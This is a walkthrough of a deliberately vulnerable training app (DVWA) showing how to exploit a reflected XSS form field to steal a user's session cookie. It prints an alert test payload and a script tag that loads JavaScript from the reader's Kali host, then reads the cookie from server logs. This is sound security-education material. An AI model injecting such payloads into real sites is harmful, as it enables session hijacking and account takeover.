<b>Challenge URL:</b> /dvwa/vulnerabilities/xss_r/
<br>
<b>Objective:</b> Steal the cookie of a logged-in user.
<br>
<b>Tools needed:</b> A temporary web server
<br><br>
<i>Did you remember to read this section's <a href="https://github.com/mrudnitsky/dvwa-guide-2019/blob/master/low/README.md">README</a>?</i>

<h2><b>The Guide</b></h2>

<i>Note: This challenge is extremely similar to <a href="https://github.com/mrudnitsky/dvwa-guide-2019/blob/master/low/Challenge%2010:%20XSS%20(DOM).md" target="_blank">Challenge 10</a>. We'll be using the same web server, exploit, and payload as before, so make sure those are good to go before proceeding.</i>

We see a basic web form with a field we can fill out.

<img src="https://github.com/mrudnitsky/dvwa-guide-2019/blob/master/low/screenshots/xssrform.png" width="500">

When we input a name into the field and click the "Submit" button, we see the string "Hello [inputted_name]" returned back to us.

<img src="https://github.com/mrudnitsky/dvwa-guide-2019/blob/master/low/screenshots/xssrtest.png" width="500">

Interesting. Can we cause an <code>alert</code> popup to occur using this field?

<code>&#60;script&#62;alert(document.cookie)&#60;/script&#62;</code>

<img src="https://github.com/mrudnitsky/dvwa-guide-2019/blob/master/low/screenshots/xssrtestalert.png" width="500">

<i>Note that I actually input <code>document.cookie.split(";")[0]</code> as my payload, in order to hide my session ID. Just a privacy thing for me. You don't have to do that, and it impacts nothing besides what you see in my screenshots.</i>

Perfect! Instead of using <code>alert()</code>, let's use our previous exploit/payload combo from <a href="https://github.com/mrudnitsky/dvwa-guide-2019/blob/master/low/Challenge%2010:%20XSS%20(DOM).md" target="_blank">Challenge 10</a>.

<code>&#60;script src="http://[your_Kali_IP]:9999/a.js"&#62;&#60;/script&#62;</code>

<img src="https://github.com/mrudnitsky/dvwa-guide-2019/blob/master/low/screenshots/xssrexploit.png" width="500">

If we inspect the form's source code after we input the exploit, we see it's been successfully inserted into the page:

<img src="https://github.com/mrudnitsky/dvwa-guide-2019/blob/master/low/screenshots/xssrsource.png" width="500">

And examining the Python web server logs shows the cookie:

<img src="https://github.com/mrudnitsky/dvwa-guide-2019/blob/master/low/screenshots/xssrcookie.png" width="500">

Easy enough! Challenge complete.
